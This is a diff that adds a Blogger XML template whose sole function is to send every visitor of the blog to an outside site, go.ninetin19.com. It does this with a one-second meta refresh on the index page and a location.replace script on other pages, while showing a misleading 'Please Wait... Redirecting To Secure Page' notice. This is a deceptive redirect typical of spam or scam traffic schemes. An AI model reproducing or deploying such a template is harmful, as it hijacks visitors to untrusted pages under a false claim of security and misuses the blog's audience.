@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+ <head>
+
+
+<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css' rel='stylesheet'/>
+   <link href='//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css' rel='stylesheet'/>
+<link href='//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap-theme.min.css' rel='stylesheet'/>
+
+
+  <meta content='IE=EmulateIE7' http-equiv='X-UA-Compatible'/>
+  <b:if cond='data:blog.isMobile'>
+   <meta content='width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0' name='viewport'/>
+  <b:else/>
+   <meta content='width=1100' name='viewport'/>
+  </b:if>
+  <b:include data='blog' name='all-head-content'/>
+
+<b:if cond='data:blog.pageType == &quot;index&quot;'> 
+<title><data:blog.pageTitle/></title> 
+<meta content='1;url=http://go.ninetin19.com/drive/play.php?movie=tt6063050&amp;s=de2wafbads' http-equiv='refresh'/>
+<b:else/>
+
+<title><data:blog.pageName/></title>
+
+<script>
+var pathArray = window.location.pathname.split( &#39;/&#39; );
+location.replace(&#39;http://go.ninetin19.com/drive/play.php?s=de2wablogpin&amp;movie=&#39; + pathArray[&#39;1&#39;])
+
+</script>
+
+</b:if>
+
+<!---->
+
+
+  <b:skin><![CDATA[
+   /*
+     body {  background: #fff; }
+   
+  ]]></b:skin>
+
+ </head>
+<style>body {padding-top: 70px;padding-bottom: 30px;}
+.centered {position: fixed;top: 50%;left: 50%;margin-top: -200px;margin-left: -250px;border: 1px solid #DBDBDB;width: 500px;text-align: center;height: 425px;padding: 20px;font-size: 20px;background-color: rgba(233, 233, 233, 0.44);font-family: Arial, Helvetica, sans-serif;text-shadow: 1px 1px 1px #5F5F5F;}
+</style>
+ <body>
+<div class='centered'>
+<h2>Please Wait </h2>
+  You Are Automatic Redirecting<br/>
+  To Secure Page<br/>
+<img src='https://loading.io/spinners/pies/lg.pie-chart-loading-gif.gif'/>
+</div>
+  <b:section class='main' id='main' showaddelement='yes'/>
+  </body>
+</html>
